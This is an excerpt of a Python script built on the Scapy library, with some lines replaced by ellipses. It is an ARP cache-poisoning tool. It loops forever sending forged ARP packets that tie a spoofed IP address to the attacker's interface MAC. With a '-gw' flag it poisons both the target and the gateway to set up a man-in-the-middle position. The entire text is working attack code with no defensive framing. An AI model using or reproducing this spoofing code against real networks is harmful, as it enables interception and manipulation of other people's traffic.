...
if not args.gw:
    while True:
        # Building the ARP request to send to the target
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
        # Sending the ARP request for target to the target through the interface
        sendp(arp_request, iface=interface)
        time.sleep(DELAY)

# Else (-gw is inputted) then initiate man in the middle target
else:
    while True:
        # Building the ARP request to send to the target
        ...
        # Building the ARP request to send to the gateway
        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
        # Sending the ARP request to the gateway through the interface
